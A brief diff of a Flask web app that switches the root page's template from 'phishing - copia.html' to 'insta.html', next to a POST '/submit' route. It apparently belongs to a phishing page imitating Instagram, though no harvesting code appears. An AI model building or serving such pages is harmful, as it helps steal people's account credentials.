@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('phishing - copia.html')
+    return render_template('insta.html')
 
 
 @app.route('/submit', methods=['POST'])
